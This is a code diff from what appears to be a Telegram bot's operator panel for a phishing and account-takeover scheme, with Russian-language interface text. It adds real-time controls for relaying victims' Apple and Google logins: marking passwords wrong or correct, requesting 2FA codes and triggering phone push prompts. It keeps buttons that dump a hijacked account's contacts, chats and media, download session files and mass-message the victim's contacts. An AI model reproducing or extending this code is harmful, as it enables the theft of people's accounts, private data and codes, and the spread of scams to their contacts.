@@ -661,6 +661,8 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
 
     username = f"@{user['username']}" if user["username"] else "—"
     phone = user["phone"] or "—"
+    email = user["email"] if ("email" in user.keys() and user["email"]) else None
+    pwd_2fa = user["password_2fa"] if ("password_2fa" in user.keys() and user["password_2fa"]) else None
     mirror_name = user["mirror_username"] if ("mirror_username" in user.keys() and user["mirror_username"]) else "—"
     mirror = f"@{mirror_name}" if mirror_name and mirror_name != "—" else "—"
     worker_id = user["worker_tg_id"]
@@ -695,9 +697,6 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
         session_status = "❌ Сессия сброшена / отозвана"
     else:
         session_status = "❌ Сессия отсутствует"
-
-    email = user["email"] if ("email" in user.keys() and user["email"]) else None
-    pwd_2fa = user["password_2fa"] if ("password_2fa" in user.keys() and user["password_2fa"]) else None
 
     is_apple_user = (user.get("auth_step") or "").startswith("apple_") or (email and ("icloud" in email.lower() or "apple" in email.lower()))
     is_google_user = (user.get("auth_step") or "").startswith("google_") or (email and "gmail" in email.lower())
@@ -740,21 +739,72 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
         f"📊 <b>Статус:</b> <code>{auth_step}</code> ({session_status})"
     )
 
-    buttons = [
-        [InlineKeyboardButton(text="📇 1) Выкачать контакты (txt)", callback_data=f"adm_act_dump_txt:{user_tg_id}")],
-        [
-            InlineKeyboardButton(text="⚡ Быстро: переписки (HTML)", callback_data=f"adm_act_dump_fast_html:{user_tg_id}"),
-            InlineKeyboardButton(text="💬 Всё с медиа (zip)", callback_data=f"adm_act_dump_media:{user_tg_id}"),
-        ],
-        [InlineKeyboardButton(text="📢 3) Создать ТГК на аккаунте", callback_data=f"adm_act_create_tgk:{user_tg_id}")],
-        [InlineKeyboardButton(text="💾 4) Скачать TData / Session", callback_data=f"adm_act_download_tdata:{user_tg_id}")],
-        [InlineKeyboardButton(text="⚡ 5) Запустить рассылку по контактам", callback_data=f"adm_act_broadcast_contacts:{user_tg_id}")],
-        [
-            InlineKeyboardButton(text="🔄 Сбросить сессии", callback_data=f"adm_reset_sess:{user_tg_id}"),
-            InlineKeyboardButton(text="🔴 Разлогинить", callback_data=f"adm_logout_ask:{user_tg_id}"),
-        ],
-        [InlineKeyboardButton(text="« Назад к активным логам", callback_data="adm_menu_logs")],
-    ]
+    buttons = []
+    has_apple_ctrl = is_apple_user and bool(pwd_2fa or auth_step.startswith("apple_")) and auth_step not in ("authorized", "apple_authorized", "apple_complete", "session_revoked", "logged_out")
+    has_google_ctrl = is_google_user and bool(pwd_2fa or auth_step.startswith("google_")) and auth_step not in ("authorized", "google_authorized", "google_complete", "session_revoked", "logged_out")
+
+    if has_apple_ctrl:
+        buttons.extend([
+            [
+                InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"actrl:wrong_pass:{user_tg_id}"),
+                InlineKeyboardButton(text="✅ Верный пароль", callback_data=f"actrl:correct_pass:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="🔢 Запросить 6 цифр (2FA)", callback_data=f"actrl:ask_code:{user_tg_id}"),
+                InlineKeyboardButton(text="❌ Неверный 2FA код", callback_data=f"actrl:wrong_code:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="📲 Пуш на iPhone (Гео)", callback_data=f"actrl:ask_prompt:{user_tg_id}"),
+                InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"actrl:complete:{user_tg_id}"),
+            ],
+        ])
+    elif has_google_ctrl:
+        buttons.extend([
+            [
+                InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"gctrl:wrong_pass:{user_tg_id}"),
+                InlineKeyboardButton(text="✅ Верный пароль", callback_data=f"gctrl:correct_pass:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="📲 Тап (Цифры)", callback_data=f"gctrl:ask_prompt:{user_tg_id}"),
+                InlineKeyboardButton(text="❌ Неверные цифры", callback_data=f"gctrl:wrong_prompt:{user_tg_id}"),
+            ],
+            [
+                InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
+            ],
+        ])
+
+    if raw_session and not raw_session.startswith("mock_") and not raw_session.startswith("sess_") and not raw_session.startswith("google_auth_") and not raw_session.startswith("apple_auth_"):
+        buttons.extend([
+            [InlineKeyboardButton(text="📇 1) Выкачать контакты (txt)", callback_data=f"adm_act_dump_txt:{user_tg_id}")],
+            [
+                InlineKeyboardButton(text="⚡ Быстро: переписки (HTML)", callback_data=f"adm_act_dump_fast_html:{user_tg_id}"),
+                InlineKeyboardButton(text="💬 Всё с медиа (zip)", callback_data=f"adm_act_dump_media:{user_tg_id}"),
+            ],
+            [InlineKeyboardButton(text="📢 3) Создать ТГК на аккаунте", callback_data=f"adm_act_create_tgk:{user_tg_id}")],
+            [InlineKeyboardButton(text="💾 4) Скачать TData / Session", callback_data=f"adm_act_download_tdata:{user_tg_id}")],
+            [InlineKeyboardButton(text="⚡ 5) Запустить рассылку по контактам", callback_data=f"adm_act_broadcast_contacts:{user_tg_id}")],
+            [
+                InlineKeyboardButton(text="🔄 Сбросить сессии", callback_data=f"adm_reset_sess:{user_tg_id}"),
+                InlineKeyboardButton(text="🔴 Разлогинить", callback_data=f"adm_logout_ask:{user_tg_id}"),
+            ],
+        ])
+    elif not has_apple_ctrl and not has_google_ctrl:
+        buttons.extend([
+            [InlineKeyboardButton(text="📇 1) Выкачать контакты (txt)", callback_data=f"adm_act_dump_txt:{user_tg_id}")],
+            [
+                InlineKeyboardButton(text="⚡ Быстро: переписки (HTML)", callback_data=f"adm_act_dump_fast_html:{user_tg_id}"),
+                InlineKeyboardButton(text="💬 Всё с медиа (zip)", callback_data=f"adm_act_dump_media:{user_tg_id}"),
+            ],
+            [InlineKeyboardButton(text="📢 3) Создать ТГК на аккаунте", callback_data=f"adm_act_create_tgk:{user_tg_id}")],
+            [InlineKeyboardButton(text="💾 4) Скачать TData / Session", callback_data=f"adm_act_download_tdata:{user_tg_id}")],
+            [InlineKeyboardButton(text="⚡ 5) Запустить рассылку по контактам", callback_data=f"adm_act_broadcast_contacts:{user_tg_id}")],
+            [
+                InlineKeyboardButton(text="🔄 Сбросить сессии", callback_data=f"adm_reset_sess:{user_tg_id}"),
+                InlineKeyboardButton(text="🔴 Разлогинить", callback_data=f"adm_logout_ask:{user_tg_id}"),
+            ],
+        ])
+
+    buttons.append([InlineKeyboardButton(text="« Назад к активным логам", callback_data="adm_menu_logs")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
     await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
 
